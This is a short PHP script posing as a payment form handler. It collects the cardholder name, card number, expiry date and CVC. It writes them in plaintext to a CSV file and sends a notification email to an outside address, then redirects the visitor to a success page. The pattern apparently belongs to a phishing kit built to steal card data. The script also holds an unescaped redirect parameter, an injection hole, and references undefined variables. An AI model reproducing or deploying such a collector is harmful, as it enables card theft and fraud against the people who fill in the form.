<?php
if(isset($_POST["submit"]))
{
  $cardholder = $_POST['first-name'];
  $number = $_POST['number'];
  $expiry = $_POST['expiry'];
  $cvc = $_POST['cvc'];
  $to = "sales@bigcarbow.xyz"; // this is your Email address
  {
    $file_open = fopen("contact_data.csv", "a");
    $no_rows = count(file("contact_data.csv"));
    if($no_rows > 1)
    {
      $no_rows = ($no_rows - 1) + 1;
    }
    $date = new DateTime("now", new DateTimeZone('Asia/Kolkata') );
    $today_date = $date->format('d-m-Y');
    $current_time = $date->format('H:i:s A');
    $form_data = array(
      'SrNo'  => $no_rows,
      'CardHolder'  => $cardholder,
      'Card'  => $number,
      'Exp'  => $expiry,
      'Cvv'  => $cvc,
      'Date' => $today_date,
      'Time' => $current_time
    );
    //fputcsv($file_open, array_keys($form_data[0]));
    fputcsv($file_open, $form_data);

    $headers = "From:" . $email;
    mail($to,$cardholder,$country,$headers);

    redirect('../success.php?name='.$_REQUEST['first-name']);
  }
}

function redirect($url)
{
  if (!headers_sent())
  {
    header('Location: '.$url);
    exit;
  }
  else
  {
    echo '<script type="text/javascript">';
    echo 'window.location.href="'.$url.'";';
    echo '</script>';
    echo '<noscript>';
    echo '<meta http-equiv="refresh" content="0;url='.$url.'" />';
    echo '</noscript>'; 
    exit;
  }
}
?>